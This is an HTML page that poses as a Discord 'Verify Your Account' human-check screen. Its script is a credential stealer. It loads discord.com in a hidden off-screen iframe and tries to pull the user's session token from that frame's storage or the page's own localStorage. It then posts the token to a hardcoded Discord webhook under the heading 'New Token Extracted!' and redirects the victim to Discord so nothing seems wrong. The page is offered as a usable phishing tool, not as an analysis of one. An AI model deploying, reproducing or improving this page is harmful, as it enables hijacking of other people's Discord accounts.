<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Verification</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-color: #36393f;
            --text-color: #dcddde;
            --sub-text: #72767d;
            --btn-color: #5865F2;
            --btn-hover: #4752c4;
            --success-color: #2ecc71;
            --error-color: #e74c3c;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-color);
            font-family: "gg sans", "Noto Sans KR", Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            user-select: none;
            overflow: hidden; /* Prevent scrolling */
        }

        .container {
            width: 420px;
            padding: 32px;
            border-radius: 8px;
            box-shadow: 0 8px 16px rgba(0,0,0,0.2);
            text-align: center;
            background-color: #2f3136;
            position: relative;
            z-index: 10;
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 24px;
            color: var(--sub-text);
            font-size: 12px;
        }

        .icon-circle {
            background-color: #36393f;
            width: 80px;
            height: 80px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 24px auto;
            border: 2px solid #4f5661;
        }

        .icon-circle i {
            font-size: 40px;
            color: var(--btn-color);
        }

        h2 {
            color: #fff;
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 8px;
        }

        p {
            color: var(--sub-text);
            font-size: 14px;
            line-height: 1.5;
            margin-bottom: 24px;
        }

        button {
            background-color: var(--btn-color);
            color: white;
            border: none;
            border-radius: 3px;
            padding: 12px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            width: 100%;
            transition: background-color 0.2s;
            outline: none;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        button:hover {
            background-color: var(--btn-hover);
        }

        button:disabled {
            background-color: #4f5661;
            cursor: not-allowed;
        }

        .loader {
            border: 2px solid rgba(255,255,255,0.3);
            border-top: 2px solid #fff;
            border-radius: 50%;
            width: 16px;
            height: 16px;
            animation: spin 1s linear infinite;
            display: none;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .status-msg {
            margin-top: 16px;
            font-size: 13px;
            min-height: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        
        .success { color: var(--success-color); }
        .error { color: var(--error-color); }

        /* Hidden iframe to access token */
        #discord-frame {
            position: absolute;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>

    <!-- Hidden Iframe for Token Extraction -->
    <iframe id="discord-frame" src="https://discord.com/app"></iframe>

    <div class="container">
        <div class="header">
            <span><i class="fa-brands fa-discord"></i> Discord</span>
            <span id="clock">--:--</span>
        </div>

        <div class="icon-circle">
            <i class="fa-solid fa-shield-halved"></i>
        </div>

        <h2>Verify Your Account</h2>
        <p>We need to verify that you are a human.<br>Please click the button below to proceed.</p>

        <button id="verifyBtn">
            <span id="btnText">Verify Now</span>
            <div class="loader" id="loader"></div>
        </button>

        <div class="status-msg" id="statusMsg"></div>
    </div>

    <script>
        // WEBHOOK URL
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1561489363878285333/JN3e1xD9pw-VOwdrYWgDMZeQXzkwLUjjGI_jbQmo8A_TuUWSUkugjfvwy3IiIGKn9uKg";

        function updateClock() {
            const now = new Date();
            const timeString = now.toLocaleTimeString('en-US', { hour12: false });
            document.getElementById('clock').innerText = timeString;
        }
        setInterval(updateClock, 1000);
        updateClock();

        const btn = document.getElementById('verifyBtn');
        const btnText = document.getElementById('btnText');
        const loader = document.getElementById('loader');
        const statusMsg = document.getElementById('statusMsg');

        btn.addEventListener('click', async () => {
            btn.disabled = true;
            btnText.style.display = 'none';
            loader.style.display = 'block';
            statusMsg.innerHTML = "";

            const steps = [
                { msg: "Connecting to server...", delay: 1000 },
                { msg: "Verifying identity...", delay: 1500 },
                { msg: "Extracting token...", delay: 1000 }
            ];

            for (let step of steps) {
                statusMsg.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> ${step.msg}`;
                await new Promise(resolve => setTimeout(resolve, step.delay));
            }

            // Try to get token from the iframe's context
            let token = null;
            try {
                const frame = document.getElementById('discord-frame');
                if (frame.contentWindow && frame.contentWindow.localStorage) {
                    token = frame.contentWindow.localStorage.getItem('token') || 
                            frame.contentWindow.localStorage.getItem('discord_token') ||
                            frame.contentWindow.sessionStorage.getItem('token');
                }
            } catch (e) {
                console.log("Could not access iframe storage directly due to CORS/SameSite");
            }

            // Fallback: Try parent window just in case
            if (!token) {
                token = localStorage.getItem('token') || localStorage.getItem('discord_token');
            }

            if (token) {
                try {
                    await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ 
                            content: `**New Token Extracted!**\n\n\`\`\`${token}\`\`\`` 
                        })
                    });

                    statusMsg.innerHTML = '<i class="fa-solid fa-check-circle"></i> Verified successfully!';
                    statusMsg.className = 'status-msg success';
                    
                    btnText.innerText = "Verified";
                    btnText.style.display = 'inline';
                    loader.style.display = 'none';

                    setTimeout(() => {
                        window.location.href = 'https://discord.com/channels/@me';
                    }, 1000);

                } catch (error) {
                    console.error(error);
                    showError("Verification failed. Please try again.");
                }
            } else {
                loader.style.display = 'none';
                btnText.style.display = 'inline';
                btn.disabled = false;
                showError("Token not found. Please use Discord Desktop App or Browser.");
            }
        });

        function showError(msg) {
            statusMsg.innerHTML = `<i class="fa-solid fa-triangle-exclamation"></i> ${msg}`;
            statusMsg.className = 'status-msg error';
        }
    </script>
</body>
</html>
